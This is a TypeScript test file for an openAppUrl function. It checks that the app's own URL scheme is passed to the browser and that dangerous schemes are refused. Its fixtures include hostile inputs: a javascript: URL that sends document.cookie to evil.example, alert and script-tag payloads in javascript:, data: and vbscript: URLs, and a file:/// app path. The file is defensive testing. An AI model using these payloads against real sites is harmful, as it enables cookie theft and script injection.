import { afterEach, expect, it, vi } from "vite-plus/test";

import { openAppUrl } from "./openAppUrl";

afterEach(() => {
  vi.unstubAllGlobals();
});

const browser = () => {
  const assign = vi.fn();
  vi.stubGlobal("window", { location: { assign } });
  return assign;
};

it("hands the app's own scheme to the browser", () => {
  const assign = browser();
  openAppUrl("rocketwright://open?thread=t-1", "rocketwright://open?thread={threadId}");
  expect(assign).toHaveBeenCalledExactlyOnceWith("rocketwright://open?thread=t-1");
});

it.each([
  ["javascript:fetch('//evil.example?'+document.cookie)//t-1", "javascript:fetch()//{threadId}"],
  ["javascript://%0aalert(1)", "javascript://%0aalert({threadId})"],
  ["data:text/html,<script>alert(1)</script>", "data:text/html,{threadId}"],
  ["vbscript:msgbox(1)", "vbscript:msgbox({threadId})"],
  ["javascript:alert(1)", "rocketwright://open?thread={threadId}"],
])("never navigates to %s", (url, template) => {
  const assign = browser();
  openAppUrl(url, template);
  expect(assign).not.toHaveBeenCalled();
});

it("keeps a refused URL from every desktop shell", () => {
  const bridge = {
    openAppUrl: vi.fn(async () => true),
    openExternal: vi.fn(async () => true),
  };
  vi.stubGlobal("window", { desktopBridge: bridge, location: { assign: vi.fn() } });
  openAppUrl("file:///Applications/Calculator.app", "file:///{workspaceRoot}");
  expect(bridge.openAppUrl).not.toHaveBeenCalled();
  expect(bridge.openExternal).not.toHaveBeenCalled();
});
